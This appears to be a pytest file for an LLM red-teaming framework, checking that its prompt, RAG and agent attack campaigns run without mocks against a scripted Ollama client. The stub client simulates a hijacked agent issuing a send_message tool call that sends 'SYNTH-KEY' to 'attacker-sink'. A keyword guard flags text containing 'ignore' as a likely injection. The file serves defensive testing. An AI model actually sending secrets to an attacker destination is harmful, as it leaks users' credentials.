"""P0 live-path guard: with backend=ollama no mock, simulated or recorded part runs.

Every Mock*/Simulated* constructor and the hand-written labeled-set loader raise.
Each domain then runs against a scripted stand-in for the ``ollama`` client (the
network boundary only), so this test stays offline. It defines "no mock content".
"""

from __future__ import annotations

from types import SimpleNamespace

import pytest

import manthan.core.cli.orchestrator as orch
import manthan.core.judge.ensemble as ensemble_mod
from manthan.core.config import RootConfig
from manthan.core.judge.guard import Guard, MockGuard
from manthan.core.model.mock_backend import MockBackend
from manthan.core.model.ollama_backend import OllamaBackend
from manthan.core.model.scheduler import ModelSlotScheduler
from manthan.core.store import Store
from manthan.modules.agent.lab import SimulatedLab
from manthan.modules.agent.mock_exfil.server import MockExfilListener
from manthan.modules.rag.pipeline import MockRagPipeline


class ScriptedOllamaClient:
    """Answers like ``ollama.Client``; on a tool turn it tries one exfil send."""

    def chat(self, model, messages, tools=None, **kw):
        if tools and not any(m.get("role") == "tool" for m in messages):
            call = {
                "function": {
                    "name": "send_message",
                    "arguments": {"destination": "attacker-sink", "body": "SYNTH-KEY"},
                }
            }
            return {"message": {"role": "assistant", "content": "", "tool_calls": [call]}}
        return {"message": {"role": "assistant", "content": "I cannot help with that."}}

    def embeddings(self, model, prompt):
        return {"embedding": [float(len(prompt) % 7), 1.0, 0.5]}

    def embed(self, model, input, **kw):
        texts = [input] if isinstance(input, str) else list(input)
        return SimpleNamespace(embeddings=[[float(len(t) % 7), 1.0, 0.5] for t in texts])


class KeywordGuard(Guard):
    name = "keyword_guard"

    def classify(self, text: str) -> float:
        return 0.9 if "ignore" in (text or "").lower() else 0.1


def _boom(*_a, **_k):
    raise AssertionError("mock/simulated/recorded part used on the live path")


@pytest.fixture
def loopback():
    from pytest_socket import enable_socket, socket_allow_hosts

    enable_socket()
    socket_allow_hosts(["127.0.0.1"])  # the live exfil listener only; Ollama is scripted


@pytest.fixture
def live(monkeypatch, tmp_path):
    for cls in (MockBackend, MockGuard, SimulatedLab, MockRagPipeline, MockExfilListener):
        monkeypatch.setattr(cls, "__init__", _boom)
    monkeypatch.setattr(ensemble_mod, "load_labeled_set", _boom)
    monkeypatch.setattr(OllamaBackend, "_make_client", lambda self: ScriptedOllamaClient())
    monkeypatch.setattr(orch, "make_guard", lambda *a, **k: KeywordGuard())
    try:  # LlamaIndex's OllamaEmbedding opens its own ollama.Client
        import llama_index.embeddings.ollama.base as li_ollama

        monkeypatch.setattr(li_ollama, "Client", lambda *a, **k: ScriptedOllamaClient())
    except ImportError:  # the [rag] extra; CI installs only .[dev]
        pass
    cfg = RootConfig()
    cfg.models.backend = "ollama"
    cfg.results_db = str(tmp_path / "live.db")
    return cfg


def _run(cfg: RootConfig, domain: str) -> Store:
    store = Store(cfg.results_db)
    backend = orch.build_backend(cfg)
    sched = ModelSlotScheduler(backend, {}, mode=cfg.models.residency.mode, ram_reader=lambda: 64.0)
    orch.run_campaign(cfg, [domain], store, smoke=True, scheduler=sched)
    return store


@pytest.mark.parametrize("domain", ["prompt", "rag"])
def test_domain_runs_without_mocks(live, domain):
    if domain == "rag":
        pytest.importorskip("llama_index.vector_stores.chroma")  # the [rag] extra
    _run(live, domain)


def test_agent_runs_without_mocks(loopback, live):
    pytest.importorskip("fastapi")  # the [agent] extra; CI installs only .[dev]
    pytest.importorskip("uvicorn")
    _run(live, "agent")


def test_calibrate_uses_real_rows(live, monkeypatch):
    from typer.testing import CliRunner

    from manthan.core.cli.main import app

    _run(live, "prompt")
    monkeypatch.setenv("MANTHAN_BACKEND", "ollama")
    monkeypatch.setenv("MANTHAN_RESULTS_DB", live.results_db)
    res = CliRunner().invoke(app, ["calibrate"])
    assert res.exit_code == 0, res.output
    assert "n=0" not in res.output


def test_no_silent_mock_guard_fallback():
    """A missing guard is an error, never a quiet MockGuard."""
    from manthan.core.config.models import DefensesConfig
    from manthan.modules.prompt.target import DefendedTarget
    from manthan.modules.rag.defenses import DefenseStack

    with pytest.raises(ValueError, match="guard"):
        DefendedTarget(None, "m")
    with pytest.raises(ValueError, match="guard"):
        DefenseStack(DefensesConfig(prompt_guard=True))
